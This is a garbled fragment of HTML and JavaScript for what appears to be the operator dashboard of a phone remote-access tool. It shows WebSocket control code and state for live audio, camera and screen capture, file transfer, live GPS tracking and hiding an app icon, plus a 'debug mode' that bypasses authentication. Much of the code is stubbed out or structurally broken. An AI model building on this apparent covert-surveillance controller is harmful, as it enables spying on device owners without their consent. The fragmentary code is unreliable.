<body>

            </div>
            <button id="liveAudioBtn"><span>🎤</span> Live Audio</button>
            <button id="stopLiveAudioBtn" style="display:none;">⏹ Stop</button>

            <div><span id="status">OFFLINE</span><button id="reconnectBtn">⟲</button></div>
        </div>
        <div id="downloadProgress">

        </div>
        <div id="content">
            <div id="main-panel">🔌 Debug mode active. WebSocket not connected.</div>

        });
        const db = firebase.firestore();
        const storage = firebase.storage();

        // Global state (no auth, no device selection)
        let selectedDeviceId = "debug-device-001";   // hardcoded for debugging
        let ws = null, reconnectTimer = null, reconnectAttempts = 0;
        let screenPC = null, cameraPC = null, audioPC = null, fileTransfers = {}, mapInstance = null;
        let currentData = [], currentPage = 0, dataType = null, currentPath = "root", selectedFiles = [];
        let screenActive = false, iconHidden = false, flashOn = false, liveGpsActive = false;
        let mediaRecorder = null, recordedChunks = [], pendingCommand = null, newAlerts = [];
        let screenMediaRecorder = null, screenRecordedChunks = [];
        let currentCameraStream = null, currentAudioStream = null;
        let currentLocation = null;
        let currentMapType = 'street';
        let liveMap = null, liveMarker = null, liveCircle = null, followLocation = false, fileTreeCache = {};

        const panel = document.getElementById('main-panel');
        const statusEl = document.getElementById('status');
        const wsDebug = document.getElementById('wsDebug');

        // Helper functions (keep all existing helpers unchanged)
        function escapeHtml(s) { /* ... */ }
        function formatBytes(b) { /* ... */ }
        // ... include all helper functions exactly as before ...

        // ==================== WEBSOCKET (unchanged) ====================
        function connectWebSocket() {
            if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) return;
            if (reconnectTimer) clearTimeout(reconnectTimer);
            setStatus('CONNECTING');
            if (wsDebug) wsDebug.innerText = '🌐 WebSocket: connecting...';
            panel.innerHTML = '⏳ Connecting to server...';
            ws = new WebSocket(CONFIG.WS_URL);
            ws.onopen = () => {
                reconnectAttempts = 0;
                ws.send('I_AM_WEB');
                setStatus('ONLINE');
                panel.innerHTML = '✅ Connected to server. Ready.';
                if (wsDebug) wsDebug.innerText = '🌐 WebSocket: ONLINE';
            };
            ws.onmessage = e => handleIncomingMessage(e.data);
            ws.onclose = () => {
                setStatus('OFFLINE');
                if (wsDebug) wsDebug.innerText = '🌐 WebSocket: closed';
                panel.innerHTML = '🔌 WebSocket disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.';
                ws = null;
                const d = Math.min(1000 * Math.pow(1.5, reconnectAttempts), CONFIG.MAX_RECONNECT_DELAY);
                reconnectAttempts++;
                reconnectTimer = setTimeout(() => connectWebSocket(), d);
            };
            ws.onerror = () => { setStatus('ERROR'); if (wsDebug) wsDebug.innerText = '🌐 WebSocket: error'; };
        }

        function manualReconnect() { /* ... */ }
        function sendCommand(cmd, params = {}) { /* ... (unchanged) */ }
        function sendPlainText(t) { /* ... */ }

        // ==================== WEBRTC, MODALS, MAPS, DATA DISPLAY ====================

        function initializeDebugMode() {
            // Show main UI immediately
            document.getElementById('sidebar').style.display = '';
            document.getElementById('main').style.display = 'flex';
            document.getElementById('serverInfo').innerHTML = `Debug Device (${selectedDeviceId}) <span style="font-size:12px; color:#666;">(simulated)</span>`;
            
            // Attempt WebSocket connection (will likely fail but UI is visible)
            connectWebSocket();
            
            // Show a welcome message
            panel.innerHTML = `
                <h3>🔧 Debug Mode Active</h3>
                <p>Authentication and device selection have been bypassed.</p>
                <p>WebSocket is attempting to connect to ${CONFIG.WS_URL}. You can test UI interactions.</p>
                <p><button class="btn-ui primary" onclick="manualReconnect()">Reconnect WebSocket</button></p>
            `;
        }

        // Override any functions that rely on currentUser or auth

        const simulatedUser = { uid: "debug-user" };

        function setupEvents() {
            // ... exactly the same as before ...
        }

        // Start the app

            initializeDebugMode();

        };
